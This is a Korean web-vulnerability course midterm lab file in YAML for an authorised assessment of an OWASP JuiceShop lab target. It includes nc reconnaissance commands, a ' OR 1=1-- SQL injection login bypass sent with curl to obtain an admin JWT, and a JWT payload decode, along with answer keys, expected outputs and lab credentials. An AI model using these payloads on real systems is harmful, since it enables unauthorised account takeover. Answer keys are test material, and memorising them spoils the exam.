lab_id: standalone-web-vuln-week08
title: "중간고사 — JuiceShop 종합 점검(W01~W07) vs 통합 탐지·보고"
version: standalone-web-vuln
course: web-vuln
week: 8
description: |
  웹취약점 트랙 중간고사. W01(HTTP)~W07(RCE 계열)에서 익힌 7개 점검 역량을 단 하나의 표적
  웹앱(OWASP JuiceShop)에 WSTG 방법론으로 종합 적용한다. 정찰(HTTP 메서드/정보 노출) →
  인증 우회(로그인 SQLi → JWT 분석) → 입력 취약점(SQLi/XSS) → 접근제어(무인증 관리/강제
  브라우징) → 탐지 통합(WAF) → 심각도 평가 → 종합 보고 → 권고의 한 바퀴를 돈다. 점검은
  외부 공격자 VM 192.168.0.202(att/1, 출처 192.168.0.202)에서 공인 진입 192.168.0.161로 Host 헤더로 표적
  vhost(juice/dvwa)를 지정해 수행한다 — `ssh att@192.168.0.202`(비번 1)로 접속해 공격한다. 인가된 표적
  (juice.el34.lab/dvwa.el34.lab)만 점검하며, 발견은 "취약점이 있다"가 아니라 재현 절차+증거(응답 코드·JWT
  payload·WAF 룰 번호)로 입증한다. 방어 로그 확인은 `ssh ccc@{{TARGET_IP}}`(el34) 후 `docker exec -it el34-web bash`.
difficulty: hard
duration_minutes: 220
prerequisites:
  - "W01–W07 통과 (HTTP·스캐너·정보수집·인증/세션·SQLi·XSS·RCE 계열 점검 역량)"
  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}) + docker exec 외부 공격자 VM 192.168.0.202"
  - "lecture §2(WSTG 한 바퀴: 정찰→인증→입력→접근제어→보고)·§5(WSTG/OWASP 매핑·심각도) 숙지"
objectives:
  - "OWASP WSTG 점검 순서(정보수집→인증/세션→입력 검증→접근제어→보고)를 한 표적(JuiceShop)에 종합 적용"
  - "로그인 SQLi 인증 우회(' OR 1=1--)로 관리자 JWT 획득 + JWT payload 디코드로 정보 노출 입증"
  - "무인증 관리 엔드포인트·강제 브라우징으로 접근제어 실패(OWASP A01) 입증"
  - "점검 흔적이 방어 측 WAF(ModSecurity CRS 913/941/942/93x)에 남음을 확인(점검자/방어자 양면)"
  - "발견 취약점을 CVSS 기반 심각도(Critical~Low)로 분류하고 발견→증거→심각도→권고 구조로 통합 보고"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      중간고사의 표적 **OWASP JuiceShop** 에 점검 요청이 도달하는지 확인한다(점검의 0 단계).

      ## 📖 개념 한 줄
      점검의 전제는 표적에 요청이 닿는다는 것이다. 연결이 안 되면 이후 모든 "취약점 없음" 결과가
      무의미하므로, 점검자는 본격 점검 전 항상 **도달성(reachability)** 부터 확인한다.

      ## 🧩 표적과 경로
      JuiceShop 은 OWASP 가 일부러 취약하게 만든 학습용 모던 웹앱이다. el34 의 web(Apache)은 여러
      사이트를 vhost 로 운영하므로, 어느 사이트를 점검할지는 HTTP `Host:` 헤더로 정한다 —
      `Host: juice.el34.lab` 이면 JuiceShop 으로 라우팅된다. 요청은 점검자(192.168.0.202) → fw
      게이트웨이(192.168.0.161) → web(10.20.32.80) → JuiceShop 경로로 흐른다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 juice vhost 도달 확인 — Host 헤더로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로
      echo -en "GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
      ```
      - `nc`(넷캣) = 명령줄 raw HTTP 클라이언트. 요청의 `Host: juice.el34.lab` 줄로 표적 vhost 를 지정한다.
      - `| head -1 | grep -oE '[0-9]{3}'` = 응답 상태 라인에서 **코드만** 뽑아 `juice=<코드>` 형태로
        본다(도달성·차단 여부를 빠르게 볼 때 쓴다).

      ## ✅ 합격 기준
      `juice` 출력 시 통과. **근거:** `juice=<코드>` 가 나오면 표적이 fw→web 경로로 살아 있어 점검
      가능 상태(정상 응답 코드면 착수 가능)임을 뜻한다.
    hint: '도달성'
    category: survey
    points: 8
    answer: |
      # 1) 외부 공격자 VM 192.168.0.202(attacker)에서 juice vhost 도달 확인 — Host 헤더로 표적 지정, 본문 버리고 응답코드만 juice= 형식으로
      ssh att@192.168.0.202 "echo -en 'GET / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
    answer_detail: "종합 점검의 표적 = OWASP JuiceShop(의도적으로 취약한 모던 SPA). Host 헤더로 vhost 를 지정해 도달성을 확인하는 점검의 0 단계 — juice=<코드> 출력이면 표적이 fw→web 경로로 살아 있어 점검 가능 상태임을 뜻한다."
    expected_output: |
      juice=200
    verify:
      type: output_contains
      expect: 'juice'
      field: stdout
      semantic: {intent: "대상 점검", success_criteria: ["도달"], acceptable_methods: ["**[OSS] nc raw (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      WSTG 의 첫 카테고리인 **정보수집(정찰)** — 표적의 허용 HTTP 메서드와 정보 노출 경로를 훑어
      표면 지도를 그린다(W01 HTTP·W03 정보수집 복습).

      ## 📖 개념 한 줄
      본격 점검 전에 표적의 표면(어떤 메서드가 열려 있고, 링크에 없는 경로가 노출됐는가)을 먼저
      알아야 이후 단계의 입력이 생긴다. 정찰 결과는 그 자체로 작은 취약점(정보 노출)이기도 하다.

      ## 🧩 두 가지 점검
      - **HTTP 메서드 열거(OPTIONS).** `OPTIONS` 는 "이 리소스에 어떤 메서드를 쓸 수 있나"를 묻는
        메서드로, 서버는 `Allow:` 헤더로 허용 목록을 답한다. `PUT`/`DELETE` 가 열려 있으면 파일
        변조/삭제 위험의 단서다.
      - **강제 브라우징(/ftp).** 화면의 링크를 따르지 않고 URL 을 직접 입력해 숨겨진 경로(`/ftp`)에
        접근을 시도한다. 200 이면 정보 노출(접근제어 실패)의 단서다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 허용 HTTP 메서드 열거 — OPTIONS 요청의 Allow 헤더/상태줄만 확인(PUT/DELETE 열림은 변조 단서)
      echo -en 'OPTIONS / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -iE '^Allow|^HTTP' | head -2
      # 2) 강제 브라우징 — 숨은 경로 /ftp 에 직접 접근 → ftp= 응답코드(200이면 정보 노출 단서)
      echo -en "GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
      ```
      - 요청 라인 `OPTIONS / HTTP/1.0` = 메서드를 OPTIONS 로 지정. nc 응답은 헤더 포함. `grep -iE '^Allow|^HTTP'`
        = 상태줄과 `Allow` 헤더만 추려 본다.

      ## ✅ 합격 기준
      `ftp=` 출력 시 통과. **근거:** Allow 메서드 목록과 `ftp=<코드>` 가 나오면 정찰 성공이며,
      `/ftp` 가 200 이면 정보 노출(접근제어 실패 A01) 단서를 확보한 것이다.
    hint: 'OPTIONS + /ftp'
    category: recon
    points: 10
    answer: |
      # 1) 허용 HTTP 메서드 열거 — OPTIONS 요청의 Allow 헤더/상태줄만 확인(PUT/DELETE 열림은 변조 단서)
      ssh att@192.168.0.202 "echo -en 'OPTIONS / HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | grep -iE '^Allow|^HTTP' | head -2"
      # 2) 강제 브라우징 — 숨은 경로 /ftp 에 직접 접근 → ftp= 응답코드(200이면 정보 노출 단서)
      ssh att@192.168.0.202 "echo -en 'GET /ftp HTTP/1.0\r\nHost: juice.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'"
    answer_detail: "정찰(WSTG 정보수집) = HTTP 메서드 열거(OPTIONS → Allow 헤더, W01)와 정보 노출 점검(/ftp 강제 브라우징, W03). 표적의 표면 지도를 그려 이후 단계의 진입점을 찾는다 — ftp= 응답 코드가 출력되면 정찰 성공이며, /ftp 가 200 이면 정보 노출(접근제어 실패 A01)의 단서다."
    expected_output: |
      HTTP/1.1 204 No Content
      ftp=200
    verify:
      type: output_contains
      expect: 'ftp='
      field: stdout
      semantic: {intent: "HTTP/정보수집", success_criteria: ["메서드+정보"], acceptable_methods: ["**[OSS] OPTIONS+/ftp (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      WSTG 인증 카테고리 — JuiceShop 로그인 API 에 SQL 조각을 넣어 정상 자격 없이 로그인을 통과하고
      (**SQLi 인증 우회**) 관리자 **JWT** 를 획득한다(W04 복습, OWASP A07).

      ## 📖 개념 한 줄
      인증은 가장 치명적인 점검 영역이다. 로그인이 뚫리면(인증 우회) 그 위에 쌓인 모든 권한이
      무너진다. JuiceShop 의 로그인 쿼리가 입력을 SQL 에 그대로 이어붙이는 결함을 노린다.

      ## 🧩 왜 ' OR 1=1-- 로 뚫리나
      로그인 쿼리가 대략 `... WHERE email='<입력>' AND password='<입력>'` 일 때, 이메일 자리에
      `' OR 1=1--` 을 넣으면 `... WHERE email='' OR 1=1-- ...` 가 된다. `OR 1=1` 은 **항상 참**이고
      `--` 는 그 뒤(비밀번호 검사)를 주석 처리해 무력화한다. 결과적으로 비밀번호 없이 첫 사용자(보통
      관리자)로 로그인되어 **JWT**(로그인 상태를 담은 서명 토큰)가 발급된다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 로그인 본문 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json
      # 2) 그 페이로드(@파일)를 juice 로그인 API에 POST → 응답 앞 100자 확인(authentication 토큰 구조=우회 성공)
      curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | head -c 100  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo ""
      # 3) 임시 파일 정리
      rm -f /tmp/wv8.json
      ```
      - 앞의 base64 는 로그인 본문 `{"email":"' OR 1=1--","password":"x"}` 를 담은 것이다(이메일
        자리에 SQLi 조각). `-d @/tmp/wv8.json` 으로 그 JSON 본문을 POST 한다.

      ## ✅ 합격 기준
      `authentication` 출력 시 통과. **근거:** 응답 본문에 `authentication`(토큰을 담은 구조)이
      나타나면 비밀번호 없이 관리자로 로그인된 인증 우회 성공이다.
    hint: "' OR 1=1-- → token"
    category: manipulation
    points: 12
    answer: |
      # 1) 로그인 본문 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json'
      # 2) 그 페이로드(@파일)를 juice 로그인 API에 POST → 응답 앞 100자 확인(authentication 토큰 구조=우회 성공)
      ssh att@192.168.0.202 'curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | head -c 100'  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo ""
      # 3) 임시 파일 정리
      ssh att@192.168.0.202 'rm -f /tmp/wv8.json'
    answer_detail: "인증 우회(WSTG 인증, OWASP A07) = 로그인 이메일 자리에 ' OR 1=1-- 를 주입 → 조건이 항상 참이 되어 비밀번호 없이 첫 사용자(관리자)로 로그인 → admin JWT 발급. 응답에 authentication(토큰 구조)이 나타나면 우회 성공이며, 본 시험에서 Critical 로 평가되는 대표 발견이다."
    expected_output: |
      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI
    verify:
      type: output_contains
      expect: 'authentication'
      field: stdout
      semantic: {intent: "인증 우회", success_criteria: ["token"], acceptable_methods: ["**[OSS] login SQLi (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      앞 미션에서 얻은 **JWT** 의 가운데 조각(payload)을 디코드해, 그 안에 `email` 등 내부 정보가
      그대로 노출됨을 입증한다(W04, WSTG 세션).

      ## 📖 개념 한 줄
      JWT 는 `헤더.payload.서명` 세 부분이 점(`.`)으로 이어진 토큰이다. 가운데 **payload 는 암호화가
      아니라 단순 base64 인코딩**일 뿐이라 누구나 디코드해 안의 값을 읽을 수 있다. 그래서 payload 에
      민감 정보를 담으면 그 자체가 정보 노출 취약점이다.

      ## 🧩 무엇을 보나
      획득한 JWT 의 가운데 조각을 base64 로 디코드하면 로그인된 사용자의 `email`(인증 우회로 들어간
      관리자 계정) 등이 평문으로 드러난다. "토큰이니 안전하다"는 오해를 직접 깨는 단계다.

      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON으로 저장
      # 2) juice 로그인 응답에서 token(JWT) 추출(sed) → 가운데 칸(payload)만 잘라(cut -f2) base64url→base64 치환(tr) 후 디코드(앞 200자)
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json
      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 200; rm -f /tmp/wv8.json
      echo ""
      ```
      - 인증 우회로 받은 응답에서 `sed` 로 `token` 값(JWT)을 추출 → `cut -d. -f2` 로 가운데
        조각(payload)만 떼어내 → `tr "_-" "/+"` 로 URL-safe base64 를 표준 base64 로 바꾼 뒤
        `base64 -d` 로 디코드한다.

